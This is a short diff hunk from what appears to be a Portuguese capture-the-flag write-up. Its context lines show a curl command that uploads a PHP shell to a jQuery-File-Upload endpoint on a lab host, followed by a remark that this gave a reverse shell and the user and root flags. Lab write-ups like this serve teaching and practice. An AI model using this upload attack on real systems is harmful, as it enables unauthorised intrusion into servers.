@@ -112,7 +112,6 @@ Shellcodes: No Results
 
 ```bash
 curl -F 'files=@/dcruz/ehpt/homelander/exploit/shell.php' http://10.0.0.14/build/themes/dashboard/assets/plugins/jquery-file-upload/server/php/
-
 ```
 
 - Ao navegar ao site, foi obtido o shell reverso na maquina, possibilitando obter a flag de user e root
